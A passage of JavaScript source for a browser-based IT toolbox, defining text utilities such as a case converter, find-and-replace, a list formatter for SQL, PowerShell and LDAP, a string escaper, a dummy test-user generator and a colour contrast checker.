      else if (v.sort === 'ip') l.sort((a, b) => ipk(a) - ipk(b));
      else if (v.sort === 'len') l.sort((a, b) => a.length - b.length);
      else if (v.sort === 'rev') l.reverse();
      else if (v.sort === 'rand') l = u.shuffle(l);
      return { text: l.join('\n'), title: `${l.length} lines` };
    },
  });
  const words = (s) => s.replace(/([a-z0-9])([A-Z])/g, '$1 $2').split(/[^A-Za-z0-9]+/).filter(Boolean);
  T({
    id: 'case-converter', name: 'Case Converter', cat: 'data',
    tags: 'upper lower title camel snake kebab pascal',
    fields: [{ k: 'x', type: 'area', label: 'Text', rows: 3 }],
    sample: { x: 'backup retention policy' },
    run(v) {
      if (!v.x.trim()) return null;
      const w = words(v.x), low = w.map((s) => s.toLowerCase()), cap = (s) => s[0].toUpperCase() + s.slice(1);
      return { kv: [['lowercase', v.x.toLowerCase()], ['UPPERCASE', v.x.toUpperCase()], ['Title Case', low.map(cap).join(' ')], ['Sentence case', v.x[0].toUpperCase() + v.x.slice(1).toLowerCase()], ['camelCase', low[0] + low.slice(1).map(cap).join('')], ['PascalCase', low.map(cap).join('')], ['snake_case', low.join('_')], ['SCREAMING_SNAKE', low.join('_').toUpperCase()], ['kebab-case', low.join('-')]] };
    },
  });
  T({
    id: 'find-replace', name: 'Find & Replace', cat: 'data',
    tags: 'bulk substitute search sed',
    fields: [
      { k: 'x', type: 'area', label: 'Text', rows: 7 },
      { k: 'map', type: 'area', label: 'Rules, one per line: find => replace', rows: 4, mono: true },
      { k: 'ci', type: 'check', label: 'Ignore case' },
    ],
    sample: { x: 'server=old-sql01\nbackup=old-sql02', map: 'old-sql01 => sql-prod-01\nold-sql02 => sql-prod-02' },
    run(v) {
      if (!v.x) return null;
      let s = v.x, n = 0;
      for (const l of u.lines(v.map)) {
        const i = l.indexOf('=>');
        if (i < 0) continue;
        const a = l.slice(0, i).trim(), b = l.slice(i + 2).trim();
        if (!a) continue;
        const re = new RegExp(a.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), v.ci ? 'gi' : 'g');
        s = s.replace(re, () => { n++; return b; });
      }
      return { text: s, title: `${n} replacement(s)` };
    },
  });
  T({
    id: 'text-stats', name: 'Text Statistics', cat: 'data',
    tags: 'word count length character lines',
    fields: [{ k: 'x', type: 'area', label: 'Text', rows: 8 }],
    sample: { x: 'Reboot completed at 02:00.\nAll services healthy.' },
    run(v) {
      if (!v.x) return null;
      const w = v.x.trim().split(/\s+/).filter(Boolean).length;
      return { kv: [['Characters', u.nf(Array.from(v.x).length, 0)], ['No spaces', u.nf(v.x.replace(/\s/g, '').length, 0)], ['Words', u.nf(w, 0)], ['Lines', u.nf(u.lines(v.x).length, 0)], ['UTF-8 bytes', u.nf(u.utf8(v.x).length, 0)], ['Reading time', u.fmtDur((w / 200) * 60)]] };
    },
  });
  T({
    id: 'list-formatter', name: 'List Formatter', cat: 'data',
    tags: 'join quote wrap in clause array comma delimiter',
    fields: [
      { k: 'x', type: 'area', label: 'Values', rows: 7 },
      { k: 'fmt', type: 'select', label: 'Output', options: [['csv', 'Comma separated'], ['sql', 'SQL IN (...)'], ['ps', 'PowerShell array'], ['py', 'JSON array'], ['ldap', 'LDAP OR filter'], ['lines', 'One per line']], value: 'sql' },
      { k: 'attr', type: 'text', label: 'LDAP attribute', value: 'sAMAccountName', mono: true, show: (v) => v.fmt === 'ldap' },
    ],
    sample: { x: 'alice\nbob\no\'brien', fmt: 'sql' },
    run(v) {
      const a = u.lines(v.x).flatMap((l) => l.split(',')).map((s) => s.trim()).filter(Boolean);
      if (!a.length) return null;
      const sq = (s) => `'${s.replace(/'/g, "''")}'`;
      const ld = (s) => s.replace(/[\\*()\0]/g, (c) => '\\' + c.charCodeAt(0).toString(16).padStart(2, '0'));
      return { csv: a.join(', '), sql: `IN (${a.map(sq).join(', ')})`, ps: `@(${a.map(sq).join(', ')})`, py: JSON.stringify(a), ldap: `(|${a.map((s) => `(${v.attr}=${ld(s)})`).join('')})`, lines: a.join('\n') }[v.fmt];
    },
  });
  T({
    id: 'text-cleaner', name: 'Text Cleaner', cat: 'data',
    tags: 'smart quotes dashes unicode normalise sanitize email outlook',
    fields: [{ k: 'x', type: 'area', label: 'Text', rows: 7 }],
    sample: { x: 'Run \u201cGet-Service\u201d \u2014 it\u2019s fine.\u200b\u00a0Don\u2019t skip\u2026' },
    run(v) {
      if (!v.x) return null;
      const s = v.x.replace(/[\u2018\u2019\u201a\u2032]/g, "'").replace(/[\u201c\u201d\u201e\u2033]/g, '"').replace(/[\u2013\u2014\u2212]/g, '-').replace(/\u2026/g, '...').replace(/[\u00a0\u2002-\u200a\u202f\u3000]/g, ' ').replace(/[\u200b-\u200f\u2060\ufeff\u00ad\u202a-\u202e]/g, '');
      return { text: s, title: `${v.x.length - s.length === 0 ? 'Cleaned' : `Length changed by ${s.length - v.x.length}`}` };
    },
  });
  T({
    id: 'string-escape', name: 'String Escaper', cat: 'data',
    tags: 'escape quote shell json regex literal',
    fields: [{ k: 'x', type: 'area', label: 'Text', rows: 4 }],
    sample: { x: 'C:\\Temp\\it\'s "here".txt' },
    run(v) {
      if (!v.x) return null;
      return { kv: [['JSON', JSON.stringify(v.x)], ['Bash', `'${v.x.replace(/'/g, `'\\''`)}'`], ['PowerShell', `'${v.x.replace(/'/g, "''")}'`], ['CMD', `"${v.x.replace(/"/g, '""').replace(/([%])/g, '$1$1')}"`], ['Regex', v.x.replace(/[.*+?^${}()|[\]\\/]/g, '\\$&')]] };
    },
  });
  T({
    id: 'lorem-ipsum', name: 'Dummy Data Generator', cat: 'data', regen: true,
    tags: 'placeholder fake test users csv lorem',
    fields: [{ k: 'kind', type: 'seg', label: 'Kind', options: ['Lorem ipsum', 'Test users CSV'], value: 'Test users CSV' }, { k: 'n', type: 'num', label: 'How many', value: 5, min: 1, max: 1000 }],
    sample: {},
    run(v) {
      const n = Math.min(+v.n || 1, 1000);
      if (v.kind === 'Lorem ipsum') {
        const W = 'lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua enim ad minim veniam quis nostrud exercitation ullamco laboris nisi aliquip ex ea commodo consequat'.split(' ');
        return Array.from({ length: n }, () => {
          const s = Array.from({ length: 30 + u.randInt(30) }, () => u.pick(W)).join(' ');
          return s[0].toUpperCase() + s.slice(1) + '.';
        }).join('\n\n');
      }
      const F = 'Avery Blake Casey Devon Elliot Finley Harper Indigo Jordan Kai Logan Morgan Noor Oakley Parker Quinn Riley Sage Taylor Val'.split(' ');
      const L = 'Adams Baker Chen Davis Evans Foster Garcia Hughes Ito Jones Khan Lewis Moore Ng Owens Patel Reid Singh Tran Wright'.split(' ');
      const D = ['IT', 'Finance', 'Sales', 'HR', 'Operations'];
      return { text: ['FirstName,LastName,Username,Email,Department', ...Array.from({ length: n }, () => { const f = u.pick(F), l = u.pick(L), s = `${f[0]}${l}`.toLowerCase(); return `${f},${l},${s},${s}@example.com,${u.pick(D)}`; })].join('\n'), name: 'test-users.csv' };
    },
  });
  // ---------- Colour ----------
  const hexOf = (s) => {
    const m = /^#?([0-9a-f]{3}|[0-9a-f]{6})$/i.exec(s.trim());
    if (!m) throw new Error('Enter a hex colour, such as #1f6feb.');
    const h = m[1].length === 3 ? m[1].replace(/./g, '$&$&') : m[1];
    return [0, 2, 4].map((i) => parseInt(h.substr(i, 2), 16));
  };
  const lum = (c) => { const f = c.map((x) => { x /= 255; return x <= 0.03928 ? x / 12.92 : ((x + 0.055) / 1.055) ** 2.4; }); return 0.2126 * f[0] + 0.7152 * f[1] + 0.0722 * f[2]; };
  IT.contrast = (a, b) => { const [x, y] = [lum(a), lum(b)].sort((p, q) => q - p); return (x + 0.05) / (y + 0.05); };
  T({
    id: 'color-converter', name: 'Colour Converter', cat: 'data',
    tags: 'hex rgb hsl contrast wcag accessibility color',
    fields: [{ k: 'c', type: 'color', label: 'Colour', value: '#1f6feb' }, { k: 'bg', type: 'color', label: 'Background to test against', value: '#ffffff' }],
    sample: { c: '#1f6feb', bg: '#ffffff' },
    run(v) {
      const c = hexOf(v.c), b = hexOf(v.bg);
      const [r, g, bl] = c.map((x) => x / 255);
      const mx = Math.max(r, g, bl), mn = Math.min(r, g, bl), l = (mx + mn) / 2, d = mx - mn;
      const s = d ? d / (1 - Math.abs(2 * l - 1)) : 0;
      const h = !d ? 0 : mx === r ? ((g - bl) / d + 6) % 6 : mx === g ? (bl - r) / d + 2 : (r - g) / d + 4;
      const cr = IT.contrast(c, b);
      return [{ kv: [['Hex', v.c.toLowerCase()], ['RGB', `rgb(${c.join(', ')})`], ['HSL', `hsl(${Math.round(h * 60)}, ${Math.round(s * 100)}%, ${Math.round(l * 100)}%)`], ['Contrast ratio', `${u.nf(cr, 2)} : 1`], ['WCAG AA text', cr >= 4.5 ? 'Pass' : 'Fail'], ['WCAG AAA text', cr >= 7 ? 'Pass' : 'Fail']] }];
    },
  });
})();
